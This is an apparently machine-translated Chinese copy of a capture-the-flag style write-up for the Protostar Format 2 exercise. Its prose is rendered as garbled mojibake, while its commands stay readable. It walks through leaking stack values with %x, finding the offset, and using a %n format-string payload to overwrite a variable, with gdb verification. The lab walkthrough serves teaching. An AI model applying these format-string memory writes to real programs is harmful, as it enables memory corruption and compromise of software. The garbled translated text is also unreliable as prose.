<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Format 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]æ¼æ´åˆ©ç”¨ç»ƒä¹ |åŸæ’æ˜Ÿ|æ ¼å¼2</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-2-73ef08011a8c?source=collection_archive---------1-----------------------#2020-05-28">https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-2-73ef08011a8c?source=collection_archive---------1-----------------------#2020-05-28</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/2efb532c4538935e46dd82617a38cc92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Olrr__pADFHp-Ygy.png"/></div></div></figure><h1 id="caa0" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">æ ¼å¼2(æ ¼å¼å­—ç¬¦ä¸²åŸºæœ¬2)</h1><p id="7db0" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">è¿™ä¸ªæŒ‘æˆ˜çš„ç›®æ ‡æ˜¯æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥åœ¨å†…å­˜ä¸­å†™å…¥æ‰€æä¾›çš„è¾“å…¥çš„ä½ç½®ï¼Œå¹¶æ‰¾åˆ°æ­£ç¡®çš„åç§»å€¼æ¥æ‰“å°è·èƒœçš„è¯­å¥ã€‚</p><ul class=""><li id="e612" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">é“¾æ¥:<a class="ae mi" href="https://exploit-exercises.lains.space/protostar/format2/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/format2/</a></li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/a4b6ea2750c378d19c4f67bebcf28125.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0G53MkheqzjAyZxapXgqyA.png"/></div></div></figure><h2 id="80d8" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æ³¨æ„äº‹é¡¹</h2><ul class=""><li id="456d" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">char buffer[512]</strong></code>:è®¾ç½®ç¼“å†²åŒºå¤§å°ä¸º512ã€‚</li><li id="f3e2" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">fgets(buffer, sizeof(buffer), stdin)</strong></code>:è·å–ç”¨æˆ·æä¾›çš„è¾“å…¥ã€‚å¹¶ä¸”å®ƒå°†ç¼“å†²åŒºå¤§å°é™åˆ¶ä¸º512ã€‚æˆ‘ä»¬æœ€å¤šå¯ä»¥è¾“å…¥511ä¸ªå­—èŠ‚ï¼Œå› ä¸ºCæ€»æ˜¯åœ¨æœ«å°¾æ·»åŠ <code class="fe nd ne nf ng b">0x00</code>ä½œä¸ºç»ˆæ­¢ç¬¦ã€‚</li><li id="947b" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">printf(buffer);</strong></code>:è¿™æ˜¯è¿™æ®µä»£ç ä¸­æ˜“å—æ”»å‡»çš„å‡½æ•°ã€‚<code class="fe nd ne nf ng b">printf()</code>å°†<em class="nm">è€Œä¸æ˜¯</em>æ£€æŸ¥æ‰€æä¾›çš„è¾“å…¥æ˜¯å¦æ˜¯é¢„æœŸçš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«ç¼–ç ä¸ºæ¥å—ä»»ä½•å­—ç¬¦ä¸²å€¼ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ‰€èƒ½åšçš„åªæ˜¯éªŒè¯æˆ‘ä»¬æ˜¯å¦å¯ä»¥æ³„æ¼å†…å­˜åœ°å€ï¼Œå¹¶ä¸”è¿˜å¯ä»¥å°†ä»»æ„ä»£ç å†™å…¥å †æ ˆ(<strong class="lb iu">ã€è¯»å–ã€‘</strong> <code class="fe nd ne nf ng b">%p</code>æˆ–<code class="fe nd ne nf ng b">%x</code> â†’ <strong class="lb iu">ã€å†™å…¥ã€‘</strong> <code class="fe nd ne nf ng b">%n</code>)ã€‚</li><li id="c2b9" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">if(target == 64) {</strong></code>:å˜é‡<code class="fe nd ne nf ng b">target</code>æ˜¯æˆ‘ä»¬éœ€è¦æŸ¥æ‰¾çš„åœ°å€ã€‚ç„¶åï¼Œé€šè¿‡åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å°†å‘<code class="fe nd ne nf ng b">target</code>å†™å…¥ä»»æ„å­—èŠ‚æ¥åŒ¹é…64ï¼Œä»¥æ‰“å°å‡ºè·èƒœçš„è¯­å¥ã€‚</li></ul></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="df61" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">æ‹†è§£(GDB)</h1><p id="c055" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">è®©æˆ‘ä»¬åæ±‡ç¼–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹çœ‹åœ¨ASMçº§åˆ«åšäº†ä»€ä¹ˆ:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="8c0f" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ gdb -q format2</strong><br/>Reading symbols from /opt/protostar/bin/format2...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel<br/>(gdb) disassemble vuln</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oh"><img src="../Images/1e065522e7005860581ed691eca53cde.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ae1HFND5S5niPtSqBq3eBQ.png"/></div></div></figure></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="ff1c" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">å‰¥å‰Š</h1><h2 id="ae73" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">åˆæ­¥ä¾¦å¯Ÿ</h2><p id="925f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">å½“æˆ‘ä»¬æä¾›ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šå›æ˜¾å‡ºæ¥ï¼Œå¹¶æ‰“å°å‡ºâ€œtarget is 0:(â€</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="f1a2" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA"' | /opt/protostar/bin/format2</strong><br/>AAAA<br/>target is 0 :(</span></pre><p id="876b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">ä½†æ˜¯å¦‚æœæˆ‘ä»¬æä¾›ä¸€äº›æ ¼å¼å­—ç¬¦ä¸²å‚æ•°(<code class="fe nd ne nf ng b">%x</code>)ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€äº›æœ‰è¶£çš„è¾“å‡º:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="fe54" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 2' | /opt/protostar/bin/format2</strong><br/>AAAA|0000200|b7fd8420    <strong class="ng iu">&lt;-- Leaking memory address</strong><br/>target is 0 :(</span><span id="0560" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%08x"</em></strong><em class="nm"> = "%x" is a Format String parameter of the hexdecimal <br/>         representation. The number "08" is called "width field" and <br/>         is the minimum which will pad the output of the %x <br/>         specified to 8 characters = 4 bytes long.</em></span></pre><h2 id="182a" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">å¯»æ‰¾åç§»</h2><p id="cf4c" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åç§»å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å †æ ˆä¸Šçœ‹åˆ°æˆ‘ä»¬æä¾›çš„è¾“å…¥ã€‚å°è¯•å¢åŠ å‡ ä¸ª<code class="fe nd ne nf ng b">%x</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åç§»é‡ä¸º4ã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="9555" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 4' | /opt/protostar/bin/format2</strong><br/>AAAA|00000200|b7fd8420|bffff5d4|<strong class="ng iu">41414141    &lt;-- chr(0x41) = "A"</strong><br/>target is 0 :(</span></pre><h2 id="d4a3" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">å¯»æ‰¾â€œç›®æ ‡â€å˜é‡åœ°å€</h2><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="3e7f" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ objdump -t format2 |grep target</strong><br/><strong class="ng iu">080496e4</strong> g     O .bss <strong class="ng iu">00000004</strong>              target</span></pre><p id="2b5b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated"><code class="fe nd ne nf ng b">target</code>çš„åœ°å€å­˜åœ¨äº<code class="fe nd ne nf ng b">0x080496e4</code>ä¸­ã€‚å°†å®ƒè½¬æ¢æˆlittle-endianæ ¼å¼= <code class="fe nd ne nf ng b">\xe4\x96\x04\x08</code>ã€‚</p><p id="371f" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">å°†ç”µæºè¾“å…¥æ›´æ”¹ä¸ºæ‰¾åˆ°çš„<code class="fe nd ne nf ng b">target</code>åœ°å€ã€‚ä½†æ˜¯è¿™æ¬¡è®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦å¯ä»¥ä½¿ç”¨<code class="fe nd ne nf ng b">%n</code>åœ¨å†…å­˜ä¸­å†™ä¸€äº›ä¸œè¥¿(= <em class="nm">å†™å…¥ä½œä¸ºå‚æ•°</em>ç»™å‡ºçš„åœ°å€ä¸­çš„å­—ç¬¦æ•°)ã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="6358" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ python -c 'print "\xe4\x96\x04\x08" + "%4$n"' | /opt/protostar/bin/format2</strong><br/>ï¿½<br/>target is 4 :(    <strong class="ng iu">&lt;-- It wrote "4" at the "target" location</strong></span><span id="146a" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%4$08n"</em></strong><em class="nm"> = Directly access the 4th parameter on stack with "4$" and <br/>           write the address </em>(\xe4\x96\x04\x08<strong class="ng iu">) </strong><em class="nm">there with "%08n"</em></span></pre></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h2 id="c584" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æœ€ç»ˆåˆ©ç”¨</h2><p id="0bc0" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">å¤ªæ£’äº†ã€‚æˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªä»»åŠ¡ç°åœ¨å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬åªéœ€è¦è®¡ç®—å‡ºåœ¨å°†è¾“å‡ºå†™å…¥<code class="fe nd ne nf ng b">target</code>æ—¶ï¼Œéœ€è¦å¤šå°‘é¢å¤–çš„å¡«å……æˆ–å®½åº¦å­—æ®µæ‰èƒ½ä½¿è¾“å‡ºè¾¾åˆ°64 (= <code class="fe nd ne nf ng b">0x40</code>åå…­è¿›åˆ¶)ã€‚è‚¯å®šæœ‰æ›´å¥½çš„æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯ç®¡å®ƒå‘¢ï¼Œè¿™æ¬¡è®©æˆ‘ä»¬ç®€å•åœ°åšä¸€ä¸ªè¯•é”™æ³•ğŸ˜›ã€‚</p><p id="1e8d" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">å¥½çš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æ·»åŠ æ›´å¤šçš„ç„Šç›˜æ—¶ï¼Œå®ƒä¼šå¢åŠ åœ¨<code class="fe nd ne nf ng b">target</code>å†™å…¥çš„è¾“å‡ºã€‚æ‰€ä»¥å¢åŠ <code class="fe nd ne nf ng b">%60d</code>å®½åº¦è§£å†³äº†è¿™ä¸ªæŒ‘æˆ˜ã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="b443" class="mo kc it ng b gy od oe l of og">$ python -c 'print "\xe4\x96\x04\x08" + <strong class="ng iu">"%10d" + "%4$08n"</strong>' | /opt/protostar/bin/format2<br/>       512<br/>target is 14 :(</span><span id="6b50" class="mo kc it ng b gy ol oe l of og">$ python -c 'print "\xe4\x96\x04\x08" + <strong class="ng iu">"%20d" + "%4$08n"</strong>' | /opt/protostar/bin/format2<br/>                 512<br/>target is 24 :(</span><span id="4400" class="mo kc it ng b gy ol oe l of og">$ python -c 'print "\xe4\x96\x04\x08" + <strong class="ng iu">"%60d" + "%4$08n"</strong>' | /opt/protostar/bin/format2<br/>                                                         512<br/><strong class="ng iu">you have modified the target :)</strong></span></pre><h2 id="e50a" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æœ€ç»ˆåˆ©ç”¨# 2(*ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆ)</h2><p id="bc44" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">å¥½å§ï¼Œç­‰ç­‰ã€‚è®©æˆ‘ç”¨ä¸€ç§ä¼˜é›…çš„æ–¹å¼è§£é‡Šä¸€ä¸‹ğŸ™‚ã€‚æˆ‘å°†å‘æ‚¨å±•ç¤ºå¦‚ä½•è®¡ç®—ç²¾ç¡®çš„å®½åº¦å­—æ®µï¼Œä»¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„è¾“å‡ºã€‚</p><p id="002a" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">é¦–å…ˆï¼Œè®©æˆ‘ä»¬å°†åˆå§‹æœ‰æ•ˆè½½è·(æ²¡æœ‰å®½åº¦å¡«å……)æ”¾å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨gdbè¿è¡Œå®ƒã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="e13d" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[Initial Payload]</strong><br/>$ python -c 'print "\xe4\x96\x04\x08" + "%4$n"' &gt; format2_payload</span></pre><p id="0250" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">ç”¨gdbè¿è¡Œ<code class="fe nd ne nf ng b">Format 2</code>ï¼Œå°†æ–­ç‚¹è®¾ç½®åœ¨<code class="fe nd ne nf ng b">cmp eax, 0x40</code>ä½ç½®ã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="3581" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ gdb -q format2</strong><br/>  Reading symbols from /opt/protostar/bin/format2...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel <br/>(gdb) disassemble vuln</strong><br/>  Dump of assembler code for function vuln:<br/>  ...(snip)...<br/>  0x0804848a &lt;vuln+54&gt;: mov    eax,ds:0x80496e4<br/>  <strong class="ng iu">0x0804848f &lt;vuln+59&gt;: cmp    eax,0x40</strong><br/>  ...(snip)...  <br/>  End of assembler dump.<br/><strong class="ng iu">(gdb) break * 0x0804848f    &lt;-- Breakpoint</strong></span></pre><p id="4a2e" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">ç°åœ¨ï¼Œè®©æˆ‘ä»¬ç”¨æœ‰æ•ˆè½½è·è¿è¡Œç¨‹åºã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="237a" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">(gdb) run &lt; /home/user/format2/format2_payload</strong><br/><br/><strong class="ng iu">### Search for the "target"</strong><br/><strong class="ng iu">(gdb) x/5x 0x80496e4</strong><br/>  0x80496e4 &lt;target&gt;: <strong class="ng iu">0x00000004</strong> 0x00000000 0x00000000 0x00000000<br/>  0x80496f4         : 0x00000000</span></pre><p id="545f" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">ä½ å¯ä»¥çœ‹åˆ°â€œ4â€è¢«å†™å…¥äº†<code class="fe nd ne nf ng b">target</code>ã€‚æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è®¡ç®—å‡ºæˆ‘ä»¬éœ€è¦å¡«å……å¤šå°‘å®½åº¦æ‰èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„è¾“å‡ºã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="40bf" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">### Width Calculation</strong><br/>"Desired byte" - "Current byte" = "Width"</span></pre><p id="9276" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">æˆ‘ä»¬åœ¨å¹¿å‘è¡Œåšè¿™ä¸ªå§ã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="a025" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">(gdb) print 0x40 - 0x04</strong><br/>  $1 = 60</span><span id="a355" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">"0x40"</strong> = Hex representation of decimal 64 of our desired value<br/><strong class="ng iu">"0x04"</strong> = The currently outputted value at the "target"</span></pre><p id="c54c" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">å¥½çš„ï¼Œå®ƒè®¡ç®—äº†60çš„å·®å¼‚ï¼Œè¿™æ˜¯æˆ‘ä»¬çš„å®½åº¦ã€‚è®©æˆ‘ä»¬æ›´æ–°æˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ï¼Œå¹¶å†æ¬¡åé¦ˆç»™gdbè¿›è¡Œç¡®è®¤ã€‚</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="02a1" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[Final Payload]</strong><br/>$ python -c 'print "\xe4\x96\x04\x08" + "%60d" + "%4$n"' &gt; format2_payload</span><span id="639f" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">[GDB]</strong><br/><strong class="ng iu">(gdb) run &lt; /home/user/format2/format2_payload</strong><br/>  Starting program: /opt/protostar/bin/format2 &lt; /home/user/format2 <br/>  /format2_payload<br/>                                                         512</span><span id="b3c7" class="mo kc it ng b gy ol oe l of og">  Breakpoint 1, 0x0804848f in vuln () at format2/format2.c:15<br/>  15 in format2/format2.c<br/><strong class="ng iu">(gdb) x/5x 0x80496e4</strong><br/>  0x80496e4 &lt;target&gt;: <strong class="ng iu">0x00000040</strong> 0x00000000 0x00000000 0x00000000<br/>  0x80496f4.        : 0x00000000<br/><strong class="ng iu">--&gt; The output is updated to 0x40 (= 64 in decimal)</strong></span><span id="539a" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">(gdb) x/3i $eip    &lt;-- Querying next 3 instruction pointers</strong><br/>  0x804848f &lt;vuln+59&gt;: cmp    eax,0x40<br/>  0x8048492 &lt;vuln+62&gt;: jne    0x80484a2 &lt;vuln+78&gt;<br/>  0x8048494 &lt;vuln+64&gt;: mov    DWORD PTR [esp],0x8048590<br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  <strong class="ng iu">you have modified the target :)</strong></span><span id="2cf8" class="mo kc it ng b gy ol oe l of og">  Program exited with code 040.</span></pre><p id="fb57" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">æ„Ÿè°¢é˜…è¯»ï¼</p><h2 id="569e" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">ä¸‹ä¸€ä¸ªæŒ‘æˆ˜:</h2><ul class=""><li id="f56b" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><a class="ae mi" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83" rel="noopener"> <strong class="lb iu">æ ¼å¼3 </strong> </a>:æ ¼å¼å­—ç¬¦ä¸²åˆ©ç”¨:åŸºæœ¬3</li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi om"><img src="../Images/4386dc7dccb932a5644c84bedccdd603.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*rniUcD9tygsUPJRC.png"/></div></div></figure></div></div>    
</body>
</html>